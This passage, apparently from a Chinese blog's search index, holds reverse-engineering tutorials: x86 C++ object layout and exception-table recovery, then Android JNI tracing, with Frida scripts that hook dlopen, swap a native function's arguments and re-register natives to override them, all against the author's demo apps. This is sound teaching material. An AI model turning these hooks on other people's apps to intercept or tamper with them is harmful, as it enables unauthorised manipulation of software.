因为面向对象,是通过行为区分的,不是通过数据区分的. 虚表用来区分每个对象是什么. 数据用来区分同类型实体的差异. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之多重继承 class CLuoTest { public: CLuoTest(); virtual ~CLuoTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"CLuoTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:15:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"多重继承 class CHunTest { public: CHunTest(); virtual ~CHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CHunTest::CHunTest() { m_nVal1 = 100; m_nVal2 = 200; strcpy(m_szName, \"Hun\"); printf(\"CHunTest::CHunTest\\r\\n\"); } CHunTest::~CHunTest() { printf(\"CHunTest::~CHunTest\\r\\n\"); } void CHunTest::Show() { printf(\"CHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } class CLuoHunTest : public CLuoTest, public CHunTest { public: CLuoHunTest(); virtual ~CLuoHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoHunTest::CLuoHunTest() { m_nVal1 = 1000; m_nVal2 = 2000; strcpy(m_szName, \"LuoHun\"); printf(\"CLuoHunTest::CLuoHunTest\\r\\n\"); } CLuoHunTest::~CLuoHunTest() { printf(\"CLuoHunTest::~CLuoHunTest\\r\\n\"); } void CLuoHunTest::Show() { printf(\"CLuoHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } 内存模型 CLuo和CHun的顺序,按继承时的书写顺序,从左到右. 构造函数 int main(int argc, char* argv[]) { CLuoHunTest* pObj = new CLuoHunTest; pObj-\u003eShow(); delete pObj; system(\"pause\"); return 0; } Debug 特征 先调父类构造,然后有几个父类,就填写几次虚表. 同类型指针转换 int main(int argc, char* argv[]) { CLuoHunTest LuoHunObj; CLuoTest* pLuoObj = \u0026LuoHunObj; CHunTest* pHunObj = \u0026LuoHunObj; //这个地方会产生一个分支 system(\"pause\"); return 0; } Debug 注意 为什么会产生一个分支? CLuoHunTest LuoHunObj; CLuoTest* pLuoObj = \u0026LuoHunObj; CHunTest* pHunObj = \u0026LuoHunObj;//这个地方会移动This指针,假如说\u0026LuoHunObj +0x10位置是CHunTest对象的位置,当\u0026LuoHunObj 不为NULL时,这样是正确的,但如果\u0026LuoHunObj为NULL,即下列代码,若无脑+0x10,结果就是错误的了 CLuoTest* pLuoObj = NULL; CHunTest* pHunObj = NULL; ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:15:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"纯虚函数识别 class CLuoTest { public: CLuoTest(); virtual ~CLuoTest(); virtual void Show() = 0; }; CLuoTest::CLuoTest() { }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; class CLuoHunTest : public CLuoTest { public: CLuoHunTest(); virtual ~CLuoHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoHunTest::CLuoHunTest() { m_nVal1 = 1000; m_nVal2 = 2000; strcpy(m_szName, \"LuoHun\"); printf(\"CLuoHunTest::CLuoHunTest\\r\\n\"); } CLuoHunTest::~CLuoHunTest() { printf(\"CLuoHunTest::~CLuoHunTest\\r\\n\"); } void CLuoHunTest::Show() { printf(\"CLuoHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } int main(int argc, char* argv[]) { CLuoHunTest LuoHunObj; LuoHunObj.Show(); system(\"pause\"); return 0; } 定位到父类虚表的第二项,纯虚函数项 Debug 特征 若强制调用纯虚函数,会出现一个错误. 因为虚表中,纯虚函数项填了一个提示错误信息,并关闭的函数指针即_purecall的函数指针. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:15:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"注意 在构造函数或析构函数中调虚函数,不会触发多态. 因为构造函数或析构函数中会回填虚表,填自身对象的虚表地址. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:15:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之菱形结构 class CLuoA { public: virtual void TestA() {} virtual void TestCoverA() {} private: int m_nValA = 0xAAAAAAAA; }; class CLuoB : virtual public CLuoA { public: virtual void TestCoverA() {} virtual void TestB() {} private: int m_nValB = 0xBBBBBBBB; }; class CLuoD : virtual public CLuoA { public: virtual void TestCoverA() {} virtual void TestD() {} private: int m_nValD = 0xDDDDDDDD; }; class CLuoE :public CLuoB, public CLuoD { public: virtual void TestCoverA() {} virtual void TestCoverB() {} virtual void TestCoverD() {} virtual void TestE() {} private: int m_nValE = 0xEEEEEEEE; }; ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:16:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"菱形结构 内存模型 构造函数 Debug 这个地方传1,表明需要填写偏移以及调祖先类构造函数. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:16:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本数据类型异常 #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e void LuoTestException(int n) { switch (n) { case 0: { throw 1; break; } case 1: { throw 3.14f; break; } case 2: { throw 6.28; break; } case 3: { throw 'L'; break; } case 4: { bool bl = false; throw bl; break; } default: break; } } int main(int argc, char* argv[]) { int nVal = 0; scanf(\"%d\", \u0026nVal); try { LuoTestException(nVal); } catch (int n) { printf(\"catch int %d\\r\\n\", n); } catch (float f) { printf(\"catch float %f\\r\\n\", f); } catch (double dbl) { printf(\"catch double %lf\\r\\n\", dbl); } catch (char ch) { printf(\"catch char %c\\r\\n\", ch); } catch (bool b) { printf(\"catch bool %d\\r\\n\", b); } catch(...) { printf(\"catch all\\r\\n\"); } system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无脑定位异常处理函数 如果我们在调试的时候,看到抛异常的函数. 我们找到SEH链第一个异常处理的地方,下断,F9运行. 按照以下定则进call. 找参数最多的call下断点. 参数一样,就同时下断,看哪个到达. 最后一层是call寄存器(eax). ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常信息关系表 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"还原异常处理结构(上半部分表) 函数开头进入SEH异常链. 找到异常函数信息结构体. 分析数据关系. 第一张表记录了该函数有几个try,以及对应的try块信息表指针数组. 第二张表记录了try对应的catch个数,以及Rtti描述. 第三张表记录了catch的类型以及catch的处理函数. 注意:catch的处理函数是有返回值的,返回到catch结束的位置. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"还原具体的异常处理代码(下半部分表) 找到函数内抛异常的函数,参数中找抛出的信息表. 找到匹配列表. 在catch信息表中找到类型信息表. 对类型信息表,做交叉引用,就可以找到对应的catch处理代码. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:17:5","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"NDK进阶 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:0:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"NDK与JNI基础 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"参考链接 https://www.jianshu.com/p/87ce6f565d37 NDK与JNI基础.mhtml ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"什么是JNI? JNI,全称为Java Native Interface,即Java本地接口,JNI是Java调用Native语言的一种特性.通过JNI可以使得Java与C/C++交互. ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNIEnv是什么? JNIEnv是一个线程相关的结构体,该结构体代表了Java在本线程的执行环境. ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNIEnv与JavaVM的区别 JavaVM: 是Java虚拟机在JNI层的代表,JNI全局仅仅只有一个. JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved); JNIEXPORT void JNI_OnUnload(JavaVM* vm, void* reserved); JNIEnv: JavaVM在线程中的代码,每个线程都有一个,JNI可能有非常多个JNIEnv. extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:4","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNIEnv的作用 调用Java函数: JNIEnv代表了Java执行环境,能够使用JNIEnv调用Java中的代码. 操作Java函数: Java对象传入JNI层就是jobject对象,需要使用JNIEnv来操作这个Java对象. ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:1:5","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNI接口追踪 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"jnitrace https://github.com/chame1eon/jnitrace #安装 pip install jnitrace #使用 jnitrace -l libnative-lib.so com.example.myapplication ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"hook_art.js https://github.com/lasting-yang/frida_hook_libart #使用 frida -U --no-pause -f package_name -l hook_art.js ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Frida查看Native层调用栈 #不是很准确 console.log('CCCryptorCreate called from:\\n' + Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join('\\n') + '\\n'); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"System.load函数追踪 Java层通过以下代码进行so的加载. static { System.loadLibrary(\"luomd5\"); } public static void loadLibrary(String libname) { Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname); } 接下来查看Android源码,跟踪Runtime类的loadLibrary0函数. //源码跟踪 //http://aospxref.com/android-8.1.0_r81/xref/libcore/ojluni/src/main/java/java/lang/Runtime.java loadLibrary0(String libname, ClassLoader classLoader) -\u003edoLoad -\u003enativeLoad -\u003eJVM_NativeLoad -\u003eLoadNativeLibrary -\u003eOpenNativeLibrary //http://aospxref.com/android-8.1.0_r81/xref/system/core/libnativeloader/native_loader.cpp?r=\u0026mo=19529\u0026fi=523#523 void *OpenNativeLibrary(JNIEnv *env, int32_t target_sdk_version, const char *path, jobject class_loader, jstring library_path, bool *needs_native_bridge, std::string *error_msg) if (class_loader == nullptr) { *needs_native_bridge = false; return dlopen(path, RTLD_NOW); //--- void *handle = android_dlopen_ext(path, RTLD_NOW, \u0026extinfo); if (handle == nullptr) { *error_msg = dlerror(); } } } 通过以上代码,我们可以知道Android系统有两种方式可以加载so文件. dlopen android_dlopen_ext 所以说,我们可以通过以下代码Hook上述两个函数,来查看我们想要的so是通过哪种方式加载的,进而执行下一步操作. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); console.log(\"dlopen:\", path); } }, onLeave: function(retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function(args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); console.log(\"android_dlopen_ext:\", path); } }, onLeave: function(retval) { } }); } setImmediate(hook_dlopen); frida -U -f com.example.luomd5 -l .\\LuoHook.js --no-pause ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:2:4","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"JNIHook ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"准备一个apk Java层 //Java层 package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(mdString(\"Hello XiaLuoHun!\")); } public static native String mdString(String string); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char* szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"替换方式 function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluomd5.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { //找到要Hook函数的地址 var mdString_addr = Module.findExportByName(\"libluomd5.so\", \"Java_com_example_luomd5_MainActivity_mdString\") console.log(\"mdString_addr: \", mdString_addr) var md5string = new NativeFunction(mdString_addr, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(mdString_addr, new NativeCallback((env, jclass, jstring) =\u003e { //打印原参数 console.log(Java.vm.tryGetEnv().getStringUtfChars(jstring, null).readCString()) //构造新参数 var newJSTRING = Java.vm.tryGetEnv().newStringUtf('XiaLuoHun 1234'); //调用 var retval = md5string(env, jclass, newJSTRING); //打印返回值 console.log(\"retval: \", Java.vm.tryGetEnv().getStringUtfChars(retval, null).readCString()); return retval }, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"])) } } }); } setImmediate(hook_dlopen); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Hook方式 也可以通过下述代码进行Hook,查看Native层函数的参数和返回值. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluomd5.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { var mdString_addr = Module.findExportByName(\"libluomd5.so\", \"Java_com_example_luomd5_MainActivity_mdString\") console.log(\"mdString_addr: \", mdString_addr) Interceptor.attach(mdString_addr, { onEnter: function (args) { var env = Java.vm.getEnv(); console.log(\"arg2 jstring: \", env.getStringUtfChars(args[2], NULL).readCString()) }, onLeave: function (retval) { var env = Java.vm.getEnv(); console.log(\"retval jstring: \", env.getStringUtfChars(retval, NULL).readCString()) } }) } } }); } setImmediate(hook_dlopen); ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:3:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"动态注册 动态注册的JNI函数在native层实现的函数名称不定,并且不一定要求相应函数是导出类型,比静态注册更安全. 通过以下函数即可完成动态注册. jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods) //第一个参数clazz, native函数所在的类,可通过FindClass这个JNI函数获取(将类名的\".\"符号换成\"/\") //第二个参数methods, 是一个数组,其中包含函数的一些签名信息以及对应在native层的函数指针 //第三个参数nMethods, 是methods数组的数量 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"示例代码 Java层 package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(mdString(\"Hello XiaLuoHun!\")); } public static native String mdString(String string); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \"md5.h\" #define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0]))) jstring LuoNativeFunc(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } static JNINativeMethod method_table[] = { {\"mdString\", \"(Ljava/lang/String;)Ljava/lang/String;\", (void *) LuoNativeFunc}, }; static int registerMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) { jclass clazz = env-\u003eFindClass(className); if (clazz == nullptr) { return JNI_FALSE; } if (env-\u003eRegisterNatives(clazz, gMethods, numMethods) \u003c 0) { return JNI_FALSE; } return JNI_TRUE; } JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) { JNIEnv *env = nullptr; if (vm-\u003eGetEnv((void **) \u0026env, JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } // 注册native方法 if (!registerMethods(env, \"com/example/luomd5/MainActivity\", method_table, NELEM(method_table))) { return JNI_ERR; } return JNI_VERSION_1_6; } LuoMd5_动态注册.7z ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"源码分析 动态注册的主要函数是RegisterNatives,下面从Android源码中分析该函数流程. //http://aospxref.com/android-8.1.0_r81/xref/art/runtime/jni_internal.cc#2241 RegisterNatives(JNIEnv* env,jclass java_class,const JNINativeMethod* methods,jint method_count){ //--- for (jint i = 0; i \u003c method_count; ++i) { const char* name = methods[i].name; const char* sig = methods[i].signature; const void* fnPtr = methods[i].fnPtr; if (UNLIKELY(name == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"method name\", i); return JNI_ERR; } else if (UNLIKELY(sig == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"method signature\", i); return JNI_ERR; } else if (UNLIKELY(fnPtr == nullptr)) { ReportInvalidJNINativeMethod(soa, c.Get(), \"native function\", i); return JNI_ERR; } //--- ArtMethod* m = nullptr; m = FindMethod\u003c...\u003e(current_class.Ptr(), name, sig); //--- const void* final_function_ptr = m-\u003eRegisterNative(fnPtr, is_fast); } -\u003e RegisterNative(fnPtr, is_fast); -\u003e SetEntryPointFromJni(new_native_method); -\u003e SetEntryPointFromJniPtrSize(entrypoint, kRuntimePointerSize); -\u003e SetDataPtrSize(entrypoint, pointer_size); -\u003e SetNativePointer(DataOffset(pointer_size), data, pointer_size); SetNativePointer里面的代码,意思就是将上述找到的Native函数指针fnPtr赋值给下方ArtMethod类中的ptr_sized_fields_ 结构体中的**data_**字段. ArtMethod结构体 //http://aospxref.com/android-8.1.0_r81/xref/art/runtime/art_method.h class ArtMethod{ protected: // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. GcRoot\u003cmirror::Class\u003e declaring_class_; // Access flags; low 16 bits are defined by spec. // Getting and setting this flag needs to be atomic when concurrency is // possible, e.g. after this method's class is linked. Such as when setting // verifier flags and single-implementation flag. std::atomic\u003cstd::uint32_t\u003e access_flags_; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t dex_code_item_offset_; // Index into method_ids of the dex file associated with this method. uint32_t dex_method_index_; /* End of dex file fields. */ // Entry within a dispatch table for this method. For static/direct methods the index is into // the declaringClass.directMethods, for virtual methods the vtable and for interface methods the // ifTable. uint16_t method_index_; // The hotness we measure for this method. Managed by the interpreter. Not atomic, as we allow // missing increments: if the method is hot, we will see it eventually. uint16_t hotness_count_; // Fake padding field gets inserted here. // Must be the last fields in the method. struct PtrSizedFields { // Short cuts to declaring_class_-\u003edex_cache_ member for fast compiled code access. mirror::MethodDexCacheType* dex_cache_resolved_methods_; // Pointer to JNI function registered to this method, or a function to resolve the JNI function, // or the profiling data for non-native methods, or an ImtConflictTable, or the // single-implementation of an abstract/interface method. void* data_; // Method dispatch from quick compiled code invokes this pointer which may cause bridging into // the interpreter. void* entry_point_from_quick_compiled_code_; } ptr_sized_fields_; }; ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"二次注册 Native层Hook思路:通过调用RegisterNatives方法注册函数,那我们可以再次调用RegisterNatives方法进行注册,覆盖掉先前注册的函数,从而实现Hook. 参考链接 https://sanfengandroid.github.io/2021/02/28/simple-java-native-hook/ 一种通用超简单的Android_Java_Native方法Hook.mhtml fake-linker-main.zip ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:4:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"调用JNI中的方法 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Frida 准备一个so文件 Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public native int LuoAdd(int n1, int n2); public static native String mdString(String string); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return 